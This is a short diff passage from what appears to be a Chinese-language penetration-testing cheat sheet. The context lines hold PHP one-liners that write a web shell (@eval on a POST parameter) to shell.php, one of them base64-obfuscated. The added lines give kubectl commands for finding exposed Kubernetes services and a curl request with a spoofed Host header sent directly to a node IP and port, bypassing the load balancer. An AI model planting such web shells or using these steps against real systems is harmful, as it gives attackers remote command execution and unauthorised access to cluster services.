@@ -141,3 +141,12 @@ file_put_contents("shell.php","<?php @eval($_POST['cmd']); ?>");
 file_put_contents("shell.php",base64_decode("PD9waHAgCkBldmFsKCRfUE9TVFsnY21kJ10pOyAKPz4="));
 ?>
 
+#  Kubernetes 
+使用kubectl get services --all-namespaces列出集群中的所有服务，然后查找类型为“LoadBalancer”或“NodePort”的服务。
+如果您的集群中设置了 Ingress 控制器，您也可以使用此命令kubectl get ingress --all-namespaces
+获取Kubernetes 集群中公开的服务
+这种错误配置允许通过向节点的 IP 和端口组合发送请求来与反向代理直接通信，完全绕过负载均衡器
+curl -i -s -k -X $’GET’ \
+-H $’Host: service-1.kube.com’ \
+$’https://<NODE-IP:8888>/'
+
